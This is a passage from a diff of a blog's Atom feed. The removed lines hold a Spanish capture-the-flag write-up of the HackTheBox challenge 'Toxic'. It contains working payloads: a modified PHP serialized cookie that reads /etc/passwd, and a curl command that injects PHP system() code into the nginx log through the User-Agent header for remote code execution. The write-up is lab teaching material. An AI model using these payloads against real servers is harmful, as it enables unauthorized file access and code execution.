-&lt;p&gt;(si quieres saber como funcionan los contructores y destructores, puedes leer &lt;a href=&quot;https://www.php.net/manual/es/language.oop5.decon.php&quot;&gt;aqui&lt;/a&gt;)&lt;/p&gt;
-
-&lt;p&gt;La vulnerabilidad radica en como se esta incluyendo el archivo (this-&amp;gt;file), esto es por que nosotros podemos manipular que archivo se puede incluir, ya que simplemente se esta incluyendo un archivo que se le pasa como valor al atributo de la clase sin ningun tipo de sanitizacion, veremos esto mas claro en la practica.&lt;/p&gt;
-
-&lt;p&gt;Usare burp suite para interceptar la peticion y ver el objeto serializado:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/img/toxic/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Vean como la cookie &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PHPSESSID&lt;/code&gt; tiene un valor que esta serializado, ateriormente vimos que esta usando base64, asi lo decodificaremos:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoxNToiL3d3dy9pbmRleC5odG1sIjt9&apos;&lt;/span&gt; | base64 -d
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;O:9:&quot;PageModel&quot;:1:{s:4:&quot;file&quot;;s:15:&quot;/www/index.html&quot;;}
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;Vemos como el objeto deserializado lleva como nombre &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PageModel&lt;/code&gt; y el valor es lo que se la indica en el atributo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;file&lt;/code&gt;, y vemos que tiene &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;file&quot;;s:15:&quot;/www/index.html&lt;/code&gt;, asi que se esta incluyendo ese archivo&lt;/p&gt;
-
-&lt;p&gt;Como mencione antes, en ninguno de los dos archivo se esta sanitizando ni madres, asi que nosotros podemos modificar el valor del atributo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;file&lt;/code&gt; de la cookie PHPSESSID, para corroborarlo, vamos a modificar el objeto deserializado y le indicaremos que incluya otro archivo:&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;O:9:&quot;PageModel&quot;:1:{s:4:&quot;file&quot;;s:11:&quot;/etc/passwd&quot;;}
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;Ahora estoy incluyendo el archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt;, antes que nada, en donde dice &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;s:11&lt;/code&gt; se refiere a la longitud de la cadena, osea la que esta despues entre comillas, esta longitud es la cantidad de caracteres, y le puse 11 por que &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt; tiene 11 caracteres.&lt;/p&gt;
-
-&lt;p&gt;Cuando le enviemos la peticion veremos el LFI:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/img/toxic/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Y asi conseguimos LFI a travez de Insecure Deserialization&lt;/p&gt;
-
-&lt;h2 id=&quot;archivos-extra&quot;&gt;Archivos extra&lt;/h2&gt;
-
-&lt;p&gt;Antes que nada, exploraremos los demas archivos que nos descargamos, primero vemos un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Dockerfile&lt;/code&gt; donde lo primero son unos acrhivos de configuracion de nginx:&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# Configure php-fpm and nginx
-COPY config/fpm.conf /etc/php7/php-fpm.d/www.conf
-COPY config/supervisord.conf /etc/supervisord.conf
-COPY config/nginx.conf /etc/nginx/nginx.conf
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-&lt;p&gt;Con esto ya sabemos que usa nginx como servidor web&lt;/p&gt;
-
-&lt;p&gt;Despues tenemos que copia la flag al directorio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;flag&lt;/code&gt;:&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;COPY flag /flag
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-&lt;p&gt;Cabe recalcar que si intentamos leer la flag con el LFI que hicimos hace un rato no vamos a poder.&lt;/p&gt;
-
-&lt;p&gt;Y como ultimo, tenemos que copia un archivo .sh:&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# Copy entrypoint
-COPY entrypoint.sh /entrypoint.sh
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-&lt;p&gt;Este archivo si podemos ver su contenido:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/ash&lt;/span&gt;
-
-&lt;span class=&quot;c&quot;&gt;# Secure entrypoint&lt;/span&gt;
-chmod 600 /entrypoint.sh
-
-&lt;span class=&quot;c&quot;&gt;# Generate random flag filename&lt;/span&gt;
-mv /flag /flag_&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;cat /dev/urandom | tr -dc &lt;span class=&quot;s1&quot;&gt;&apos;a-zA-Z0-9&apos;&lt;/span&gt; | fold -w 5 | head -n 1&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;
-
-&lt;span class=&quot;nb&quot;&gt;exec&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$@&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-&lt;p&gt;Como puden ver, se esta generando una flag con nombre random, asi que si o si debemos leerla con LFI&lt;/p&gt;
-
-&lt;h2 id=&quot;lfi-to-rce-via-log-poisoning&quot;&gt;LFI to RCE via Log Poisoning&lt;/h2&gt;
-
-&lt;p&gt;La idea de un log poisoning es manipular el contenido de los archivos de registro para inyectar codigo malicioso en los registro del servidor, en esta caso nginx, cabe recalcar que esto solo es posible si tenemos un LFI&lt;/p&gt;
-
-&lt;p&gt;Como vimos en los archivo extra, hay archivos de configuracion de nginx, mostraremos el contenido de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nginx.conf&lt;/code&gt;:&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;user www;
-pid /run/nginx.pid;
-error_log /dev/stderr info;
-
-events {
-    worker_connections 1024;
-}
-
-http {
-    server_tokens off;
-    log_format docker &apos;$remote_addr $remote_user $status &quot;$request&quot; &quot;$http_referer&quot; &quot;$http_user_agent&quot; &apos;;
-    access_log /var/log/nginx/access.log docker;
-
-    charset utf-8;
-    keepalive_timeout 20s;
-    sendfile on;
-    tcp_nopush on;
-    client_max_body_size 1M;
-
-    include  /etc/nginx/mime.types;
-
-    server {
-        listen 80;
-        server_name _;
-
-        index index.php;
-        root /www;
-
-        location / {
-            try_files $uri $uri/ /index.php?$query_string;
-            location ~ \.php$ {
-                try_files $uri =404;
-                fastcgi_pass unix:/run/php-fpm.sock;
-                fastcgi_index index.php;
-                fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
-                include fastcgi_params;
-            }
-        }
-    }
-}
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;Vemos como existe un archivo log en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/log/nginx/access.log&lt;/code&gt; al cual le podemos hacer log poisoning para envenenar el registro de nginx, para esto debemos de crear otra cookie pero indicandole ese log:&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;O:9:&quot;PageModel&quot;:1:{s:4:&quot;file&quot;;s:25:&quot;/var/log/nginx/access.log&quot;;}&apos;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;La pasamos a base64 y nos queda:&lt;/p&gt;
-
-&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;echo &apos;O:9:&quot;PageModel&quot;:1:{s:4:&quot;file&quot;;s:25:&quot;/var/log/nginx/access.log&quot;;}&apos; | base64&lt;/code&gt;&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoyNToiL3Zhci9sb2cvbmdpbngvYWNjZXNzLmxvZyI7fQo=
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;Ahora nos vamos al burpsuite y relizamos la peticion con esa cookie:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/img/toxic/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Basicamente podemos ver todas las peticiones que se han hecho, aca una:&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;206.189.29.104 - 200 &quot;GET / HTTP/1.1&quot; &quot;-&quot; &quot;Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0&quot; 
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;Vemos que en cada peticion se registra la IP, el metodo, version de HTTP, el User-Agent y la URL,&lt;/p&gt;
-
-&lt;p&gt;En un log poisoning, podemos consegir un RCE registrando nuestro codigo malicioso en el User-Agent, el metodo y la ruta, en este caso lo haremos a travez del User-Agent&lt;/p&gt;
-
-&lt;p&gt;Esto es tan facil como al final del User-Agent le indicamos lo que queremos ejecutar:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/img/toxic/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Y vemos como nuestro comando es ejecuto correctemante, y en los logs, al final del User-Agent se agrego un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bin&lt;/code&gt;:&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;206.189.29.104 - 200 &quot;GET / HTTP/1.1&quot; &quot;-&quot; &quot;Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0 bin
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;Y el resultado fue:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/img/toxic/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Ahi mismo podemos ver la flag, y como ultimo debemos de hacerle un cat, en esta caso usare curl para que vean tambien como es:&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;url -i -v &amp;lt;URL&amp;gt; -A &quot;&amp;lt;?php system(&apos;cat /flag_uDwMK&apos;); ?&amp;gt;&quot; -b &quot;PHPSESSID=Tzo5OiJQYWdlTW9kZWwiOjE6e3M6NDoiZmlsZSI7czoyNToiL3Zhci9sb2cvbmdpbngvYWNjZXNzLmxvZyI7fQo=&quot;
-&lt;/code&gt;&lt;/pre&gt;
-&lt;/div&gt;
-
-&lt;p&gt;(el nombre de la flag es diferente por que tuve que hace otra instancia)&lt;/p&gt;
-
-&lt;p&gt;Y listo, asi conseguimos la flag:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/img/toxic/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Joder, esto si es RCE  🚬&lt;/p&gt;
-
-&lt;p&gt;Eso ha sido todo, gracias por leer ❤&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/img/toxic/waifu.gif&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;</content><author><name>c4rta</name></author><category term="HTB" /><category term="LFI" /><category term="Log Poisoning" /><category term="Insecure Deserialization" /><summary type="html">En este desafio primero tenemos una deserializacion insegura en la cookie PHPSESSID la cual nos permitira un LFI, despues mediante Log Poisoning conseguiremos un RCE en el User-Agent.</summary></entry></feed>
+&lt;p&gt;&lt;img src=&quot;/assets/img/PC/waifu.gif&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;</content><author><name>c4rta</name></author><category term="HTB" /><category term="SQL injection" /><category term="gRPC" /><summary type="html">Esta es una maquina bien interesante por que no tiene puerto 80, asi que descubrimeros el puerto 50051 el cual esta siendo usado por gRPC, despues usaremos un cliente gRPC para ver un poco como se estan estructurando los protobof, con base a las respuestas de las peticiones, haremos un SQL injection en el parametro ID. Para la escalada haremos un port forwarding y explotaremos una vulnerabilidad en pyLoad.</summary></entry></feed>
